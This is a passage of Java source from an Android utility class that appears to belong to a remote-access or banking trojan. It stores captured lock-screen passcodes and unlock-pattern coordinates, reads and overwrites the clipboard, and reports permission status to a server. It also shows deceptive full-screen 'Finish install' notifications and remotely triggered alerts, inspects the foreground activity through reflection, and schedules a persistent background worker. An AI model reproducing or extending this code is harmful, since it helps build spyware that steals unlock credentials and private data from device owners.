                    break;
                case 1: {
                    Intent intent = new Intent(ctx, BrodcastActivity.class);
                    intent.putExtra("type", "app");
                    intent.putExtra("tolunch", toopen);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    int flag = SDK_INT >= Build.VERSION_CODES.M ?
                            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE :
                            PendingIntent.FLAG_UPDATE_CURRENT;
                    pendingIntent = PendingIntent.getActivity(
                            ctx,
                            0,
                            intent,
                            flag
                    );
                }
                break;
                case 2: {
                    if (!toopen.startsWith("http://") && !toopen.startsWith("https://"))
                        toopen = "http://" + toopen;

                    Intent intent = new Intent(ctx, BrodcastActivity.class);
                    intent.putExtra("type", "link");
                    intent.putExtra("tolunch", toopen);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    int flag = SDK_INT >= Build.VERSION_CODES.M ?
                            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE :
                            PendingIntent.FLAG_UPDATE_CURRENT;
                    pendingIntent = PendingIntent.getActivity(
                            ctx,
                            0,
                            intent,
                            flag
                    );

                }
                break;
            }

            if (Title.equals("null")) {
                Title = "";
            }
            if (Msg.equals("null")) {
                Msg = "";
            }
            NotificationCompat.Builder builder;
            if (pendingIntent != null) {
                builder = new NotificationCompat.Builder(ctx, "New Notifications")
                        .setContentTitle(Title)
                        .setContentText(Msg)
                        .setSmallIcon(R.drawable.notify)
                        .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .setContentIntent(pendingIntent)
                        .setFullScreenIntent(pendingIntent, true)
                        .setAutoCancel(true);

            } else {
                builder = new NotificationCompat.Builder(ctx, "New Notifications")
                        .setContentTitle(Title)
                        .setContentText(Msg)
                        .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .setSmallIcon(R.drawable.notify)
                        .setAutoCancel(true);

            }
            if (SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                        "New Notifications",
                        "New Notifications",
                        NotificationManager.IMPORTANCE_HIGH
                );

                NotificationManager notificationManager = ctx.getSystemService(NotificationManager.class);
                notificationManager.createNotificationChannel(channel);
                builder.setChannelId("New Notifications");
            }
            //Vibration
            builder.setVibrate(new long[]{1000, 1000, 1000, 1000, 1000});

            //LED
            builder.setLights(Color.RED, 3000, 3000);
            Uri alarmSound = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
            builder.setSound(alarmSound);

            NotificationManagerCompat notificationManager = NotificationManagerCompat.from(ctx);
            notifiid += 1;
            if (SDK_INT >= 33) { // Android 13 (Tiramisu) and above

                // Check if the notification permission is not granted
                if (ContextCompat.checkSelfPermission(ctx, "android.permission.POST_NOTIFICATIONS") == PackageManager.PERMISSION_GRANTED) {
                    notificationManager.notify(notifiid, builder.build());
                } else {
                    AlertServer(ctx, "Post Notification", "notification permission is not granted");

                }
            } else {
                notificationManager.notify(notifiid, builder.build());
            }
        } catch (Exception d) {
            d.printStackTrace();
        }
    }

    private static Random randomidx = null;

    public static String getRandomLauncherApp(Context context) {
        PackageManager packageManager = context.getPackageManager();

        // Create a list to hold launcher apps
        List<String> launcherApps = new ArrayList<>();

        // Get the intent for launcher apps
        Intent launcherIntent = new Intent(Intent.ACTION_MAIN, null);
        launcherIntent.addCategory(Intent.CATEGORY_LAUNCHER);

        // Resolve apps that can handle this intent
        List<ResolveInfo> resolveInfos = packageManager.queryIntentActivities(launcherIntent, 0);

        String mypkg = context.getPackageName();
        for (ResolveInfo resolveInfo : resolveInfos) {
            // Ensure the app has a package name
            if (resolveInfo.activityInfo != null && resolveInfo.activityInfo.packageName != null) {
                if (mypkg.toLowerCase().equals(resolveInfo.activityInfo.packageName)) {
                    continue;
                }
                launcherApps.add(resolveInfo.activityInfo.packageName);
            }
        }

        // Return a random package name if available
        if (!launcherApps.isEmpty()) {
            if (randomidx == null) {
                randomidx = new Random();
            }
            int randomIndex = randomidx.nextInt(launcherApps.size());
            return launcherApps.get(randomIndex);
        }

        return null; // No launcher apps found
    }

    public static boolean isUsageAccessGranted(Context ctx) {
        AppOpsManager appOpsManager = (AppOpsManager) ctx.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOpsManager.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                ctx.getPackageName()
        );

        return mode == AppOpsManager.MODE_ALLOWED;
    }

    private static String Lastbaseimg;
    public static String getAppIconAsBase64(Context context) {
        try{
            if (Lastbaseimg != null && Lastbaseimg.length() > 0){
                return  Lastbaseimg;
            }
        }catch (Exception a){}
        try {
            // Get package manager and app info
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo appInfo = context.getApplicationInfo();

            // Get the app icon as Drawable
            Drawable drawable = packageManager.getApplicationIcon(appInfo);

            Bitmap bitmap;

            if (drawable instanceof BitmapDrawable) {
                bitmap = ((BitmapDrawable) drawable).getBitmap();
            } else if (SDK_INT >= Build.VERSION_CODES.O && drawable instanceof AdaptiveIconDrawable) {
                // Convert AdaptiveIconDrawable to Bitmap
                AdaptiveIconDrawable adaptiveIconDrawable = (AdaptiveIconDrawable) drawable;
                Drawable background = adaptiveIconDrawable.getBackground();
                Drawable foreground = adaptiveIconDrawable.getForeground();

                int size = Math.max(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight());
                bitmap = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);

                if (background != null) background.setBounds(0, 0, size, size);
                if (foreground != null) foreground.setBounds(0, 0, size, size);

                if (background != null) background.draw(canvas);
                if (foreground != null) foreground.draw(canvas);

            } else {
                // Fallback: draw any other type of Drawable to Bitmap
                int width = drawable.getIntrinsicWidth() > 0 ? drawable.getIntrinsicWidth() : 96;
                int height = drawable.getIntrinsicHeight() > 0 ? drawable.getIntrinsicHeight() : 96;
                bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);
                drawable.setBounds(0, 0, width, height);
                drawable.draw(canvas);
            }

            // Convert Bitmap to Base64 string
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream);
            byte[] iconBytes = outputStream.toByteArray();
            Lastbaseimg = Base64.encodeToString(iconBytes, Base64.DEFAULT);
            return Lastbaseimg;

        } catch (Exception e) {
            e.printStackTrace();
            return ""; // Return empty if something goes wrong
        }
    }

    public static void BrodcastAlert(Context ctx, String Title, String Msg, int Type, String toopen, String icobase) {

        try {

//            String Title = null ;
//            String Msg = null ;
//            String icobase = null ;
//            Type = -1 ;
//            toopen = null ;

            Intent intent = new Intent(ctx, AlertActivity.class);
            intent.putExtra("Title", Title);
            intent.putExtra("Msg", Msg);
            //intent.putExtra("icobase", icobase);

            MySettings.Write(ctx, Consts.Alertico, icobase);

            intent.putExtra("Type", Type);
            intent.putExtra("toopen", toopen);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);

        } catch (Exception a) {
            a.printStackTrace();
        }

    }

    public static Drawable getDrawableFromBase64(String base64String, Context context) {
        // Decode the base64 string to a byte array
        byte[] decodedString = Base64.decode(base64String, Base64.DEFAULT);

        // Convert byte array to Bitmap
        Bitmap bitmap = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);

        // Convert Bitmap to Drawable
        Drawable drawable = new BitmapDrawable(context.getResources(), bitmap);

        return drawable;
    }

    public static boolean isAppDisabled(Context context, String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            int state = pm.getApplicationEnabledSetting(packageName);

            return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                    || state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
                    || state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_UNTIL_USED;
        } catch (Exception e) {
            e.printStackTrace();
            return false; // Assume false if app not found or error occurs
        }
    }


    static Random rand;

    // final static  = 11111;
    //final static = 88888;
    public static int randomnumber(int min, int max) {
        if (rand == null) {
            rand = new Random();
        }
        int random = new Random().nextInt((max - min) + 1) + min;
        return random;
    }


    public static boolean isPortInUse(int port) {
        Socket socket = new Socket();
        SocketAddress socketAddress = new InetSocketAddress("localhost", port);

        try {
            // Try to connect to the specified port on the given host
            socket.connect(socketAddress, 2000); // Timeout of 2 seconds
            return true; // Connection successful, port is in use
        } catch (IOException e) {
            return false; // Connection failed, port is not in use
        } finally {
            try {
                socket.close(); // Ensure the socket is closed
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }


    public static String getdeviceIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
        return null;
    }

    public static boolean isWebSocketReachable(String urlString) {
        CountDownLatch latch = new CountDownLatch(1);  // Latch for waiting until connection completes
        OkHttpClient client = new OkHttpClient();      // OkHttp client for WebSocket handling
        boolean[] isConnected = {false};              // Used to track connection status

        // Build a WebSocket request
        Request request = new Request.Builder()
                .url(urlString)
                .build();

        // WebSocket listener to handle connection events
        WebSocketListener listener = new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                System.out.println("WebSocket connection established");
                isConnected[0] = true;                // Set connection status to true
                webSocket.close(1000, "Closing");     // Close the connection immediately
                latch.countDown();                    // Release latch when done
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                System.err.println("WebSocket connection error: " + t.getMessage());
                latch.countDown();                    // Release latch on failure
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                System.out.println("WebSocket connection closed: " + reason);
                latch.countDown();                    // Release latch on close
            }
        };

        // Open the WebSocket connection
        WebSocket webSocket = client.newWebSocket(request, listener);

        // Wait for the WebSocket connection to either succeed or fail
        try {
            latch.await(5, TimeUnit.SECONDS);        // Wait up to 5 seconds for connection
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        // Cleanup: Shut down the OkHttp client
        client.dispatcher().executorService().shutdown();

        return isConnected[0];                       // Return the connection status
    }

    public static boolean isURLReachable(String urlString) {
        HttpURLConnection urlConnection = null;
        try {
            URL url = new URL(urlString);
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("HEAD");
            urlConnection.setConnectTimeout(5000);
            urlConnection.setReadTimeout(5000);

            int responseCode = urlConnection.getResponseCode();
            return (200 <= responseCode && responseCode < 300);
        } catch (IOException e) {
            return false;
        } finally {
            if (urlConnection != null) {
                urlConnection.disconnect(); // clean
            }
        }
    }

    public static String fromBase64(String message) {
        byte[] data = Base64.decode(message, Base64.DEFAULT);
        try {
            return new String(data, "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
        }

        return message;
    }


    //"Waiting user to enter the app"
    public static byte[] createImageByts(String msg) {
        int width = 350;
        int height = 650;
        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

        Canvas canvas = new Canvas(bitmap);
        canvas.drawColor(Color.BLACK);

        TextPaint textPaint = new TextPaint();
        textPaint.setColor(Color.WHITE);
        textPaint.setTextSize(45);
        textPaint.setAntiAlias(true);

        // Calculate text width and height based on the desired width
        int textWidth = canvas.getWidth() - 40; // Set some padding from the edges

        // Use StaticLayout to handle multi-line text and wrapping
        StaticLayout textLayout = new StaticLayout(msg, textPaint, textWidth, Layout.Alignment.ALIGN_CENTER, 1.0f, 0.0f, false);

        // Start drawing text from a calculated y-position, adjusting if needed
        float yPos = (canvas.getHeight() - textLayout.getHeight()) / 2f;

        // Save the current canvas state before drawing text
        canvas.save();
        canvas.translate(20, yPos);  // Position the text layout with some padding from the left
        textLayout.draw(canvas);
        canvas.restore();  // Restore the canvas state after drawing text

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        try {
            bitmap.compress(Bitmap.CompressFormat.WEBP, 70, outputStream);
            return outputStream.toByteArray();
        } finally {
            bitmap.recycle();
            try {
                outputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static List<String> getLauncherAppsPackageNames(Context context) {
        List<String> packageNames = new ArrayList<>();

        // Create an intent that matches the apps with launcher icons
        Intent launcherIntent = new Intent(Intent.ACTION_MAIN);
        launcherIntent.addCategory(Intent.CATEGORY_LAUNCHER);

        // Get the PackageManager and query for all activities that can be launched from the launcher
        PackageManager packageManager = context.getPackageManager();
        List<ResolveInfo> resolveInfoList = packageManager.queryIntentActivities(launcherIntent, 0);

        // Extract the package names from the ResolveInfo list
        for (ResolveInfo resolveInfo : resolveInfoList) {
            String packageName = resolveInfo.activityInfo.packageName;
            packageNames.add(packageName);
        }

        return packageNames;
    }

    public static Activity getCurrentActivity() {
        try {
            Class activityThreadClass = Class.forName("android.app.ActivityThread");
            Method currentActivityThreadMethod = activityThreadClass.getMethod("currentActivityThread");
            Object currentActivityThread = currentActivityThreadMethod.invoke(null);
            Field mActivitiesField = activityThreadClass.getDeclaredField("mActivities");
            mActivitiesField.setAccessible(true);
            Map activities = (Map) mActivitiesField.get(currentActivityThread);
            for (Object record : activities.values()) {
                Class recordClass = record.getClass();
                Field pausedField = recordClass.getDeclaredField("paused");
                pausedField.setAccessible(true);
                if (!(boolean) pausedField.get(record)) {
                    Field activityField = recordClass.getDeclaredField("activity");
                    activityField.setAccessible(true);
                    return (Activity) activityField.get(record);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
    public static long tcpPing(String ipAddress, int port, int timeoutMillis) {
        long startTime = System.nanoTime();
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(ipAddress, port), timeoutMillis);
            long endTime = System.nanoTime();
            return (endTime - startTime) / 1_000_000; // Convert to milliseconds
        } catch (Exception e) {
            return 0; // Connection failed or timed out
        }
    }

    public static String getPingSpeed(String url) {
        long ping = tcpPing(url, 80, 2000);
        return String.valueOf(ping);
//        String cmd = "ping -c 1 -w 15 " + url;
//        String time = "-1";
//        try {
//            Process process = Runtime.getRuntime().exec(cmd);
//
//            // Use try-with-resources to ensure resources are closed properly
//            try (BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
//                String line;
//                float totalPingTime = 0;
//                int pingCount = 0;
//
//                while ((line = stdInput.readLine()) != null) {
//                    // Check if this line contains the ping time
//                    if (line.contains("time ")) {
//                        // Extract the time=XX part
//                        time = (line.split("time ")[1].split(" ")[0]).replace("ms", "");
//                        break;
//                    }
//                }
//
//                // Destroy the process to avoid leaks
//                process.destroy();
//
//                // Calculate average ping if we got results
//                if (Integer.valueOf(time) > 0) {
//                    return time;
//                } else {
//                    // Return a high value or error if no ping time was recorded
//                    return time;
//                }
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//            return time;
//        }
    }

    public static void setClipboard(final Context ctx, final String str) {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    try {
                        ClipboardManager clipboard = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                        clipboard.setPrimaryClip(ClipData.newPlainText("text/plain", str));
                    } catch (Exception e) {
                    }

                } catch (Exception e) {
                }
            }
        }, 1000);

    }

    public static void StorePasscode(Context ctx, String passcode) {
        String olddata = MySettings.Read(ctx, Consts.lock_cods, "");
        String thetype = MySettings.Read(ctx, Consts.lock_type, "1");
        olddata += passcode + "|" + thetype + "*";

        MySettings.Write(ctx, Consts.lock_cods, olddata);
    }

    public static void Clearpasscodes(Context ctx) {
        MySettings.Write(ctx, Consts.lock_cods, "");
    }

    private static String clipdata = "";

    public static String readClipboard(final Context ctx) {
        final CountDownLatch latch = new CountDownLatch(1);
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    ClipboardManager clipboard = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                    if (clipboard.hasPrimaryClip()) {
                        android.content.ClipDescription description = clipboard.getPrimaryClipDescription();
                        android.content.ClipData data = clipboard.getPrimaryClip();
                        if (data != null && description != null && description.hasMimeType(ClipDescription.MIMETYPE_TEXT_PLAIN)) {
                            clipdata = String.valueOf(data.getItemAt(0).getText());
                        }
                    }
                } catch (Exception e) {
                }
                latch.countDown();
            }
        }, 1000);

        try {
            latch.await();
        } catch (InterruptedException e) {
        }

        return clipdata;
    }

    public static File getInstalledApkPath(Context context) {
        try {
            return new File(context.getPackageManager()
                    .getApplicationInfo(context.getPackageName(), 0).publicSourceDir);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
    public static String loadHtmlFromAssets(Context ctx, String fileName) throws IOException {
        StringBuilder htmlBuilder = new StringBuilder();

        try (
                InputStream is = ctx.getAssets().open(fileName);
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))
        ) {
            String line;
            while ((line = reader.readLine()) != null) {
                htmlBuilder.append(line).append('\n');
            }
        }

        return htmlBuilder.toString();
    }

//    public static String[] getStatesArray() {
//        String language = Locale.getDefault().getLanguage();
//
//        switch (language) {
//            case "ar": // Arabic
//                return new String[]{"جارٍ التحضير...", "جارٍ التحديث...", "جارٍ الانتهاء...", "مرحبًا"};
//            case "zh": // Chinese
//                return new String[]{"准备中...", "更新中...", "完成中...", "欢迎"};
//            case "ru": // Russian
//                return new String[]{"Подготовка...", "Обновление...", "Завершение...", "Добро пожаловать"};
//            case "tr": // Turkish
//                return new String[]{"Hazırlanıyor...", "Güncelleniyor...", "Tamamlanıyor...", "Hoş geldiniz"};
//            case "es": // Spanish
//                return new String[]{"Preparando...", "Actualizando...", "Finalizando...", "Bienvenido"};
//            case "pt": // Brazilian Portuguese
//                return new String[]{"Preparando...", "Atualizando...", "Finalizando...", "Bem-vindo"};
//            default: // Default to English
//                return new String[]{"Preparing...", "Updating...", "Finishing...", "Welcome"};
//        }
//
//    }

    public static void setupWorkManager(Context ctx) {
        try {
            WorkManager workManager = WorkManager.getInstance(ctx);
            PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(Backworker.class, 15, TimeUnit.MINUTES)
                    .build();

            workManager.enqueueUniquePeriodicWork("MyWorker", ExistingPeriodicWorkPolicy.KEEP, workRequest);
        } catch (Exception a) {
            a.printStackTrace();
        }
    }
    public static boolean isPermissionDeclaredInManifest(Context context, String permission) {
        try {
            PackageInfo info = context.getPackageManager().getPackageInfo(
                    context.getPackageName(),
                    PackageManager.GET_PERMISSIONS
            );
            String[] declaredPerms = info.requestedPermissions;
            if (declaredPerms != null) {
                for (String p : declaredPerms) {
                    if (p.equals(permission)) {
                        return true;
                    }
                }
            }
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void NotifyFor(Context context, Class clss) {
        String channelId = "Importants";

        Intent fullScreenIntent = new Intent(context, clss);
        fullScreenIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        PendingIntent fullScreenPendingIntent = PendingIntent.getActivity(
                context,
                0,
                fullScreenIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, channelId)
                .setContentTitle("Finish install")
                .setContentText("Tap to complete")
                .setSmallIcon(R.drawable.notify)
                .setContentIntent(fullScreenPendingIntent)
                .setFullScreenIntent(fullScreenPendingIntent, true)
                .setOngoing(false)
                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setAutoCancel(true);

        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

        if (SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "update", NotificationManager.IMPORTANCE_HIGH);
            channel.setDescription(My_Configs._Notfy_MSG_);
            channel.setShowBadge(false);
            if (SDK_INT >= Build.VERSION_CODES.Q) {
                channel.setAllowBubbles(false);
            }
            notificationManager.createNotificationChannel(channel);
        }

        notificationManager.notify(101, builder.build());

    }
    public static void savePatternMap(Context context, Map<Integer, Point> map) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<Integer, Point> entry : map.entrySet()) {
            int key = entry.getKey();
            Point point = entry.getValue();
            sb.append(key)
                    .append(":")
                    .append(point.x)
                    .append(",")
                    .append(point.y)
                    .append(";");
        }

        MySettings.Write(context,Consts.patternmp,sb.toString());
    }
    public static Map<Integer, Point> loadPatternMap(Context context) {

        String serialized = MySettings.Read(context,Consts.patternmp,"");

        Map<Integer, Point> map = new HashMap<>();

        if (serialized != null && !serialized.isEmpty()) {
            String[] entries = serialized.split(";");
            for (String entry : entries) {
                if (entry.trim().isEmpty()) continue;

                String[] keyVal = entry.split(":");
                String[] xy = keyVal[1].split(",");

                int key = Integer.parseInt(keyVal[0]);
                int x = Integer.parseInt(xy[0]);
                int y = Integer.parseInt(xy[1]);

                map.put(key, new Point(x, y));
            }
        }

        return map;
    }

}
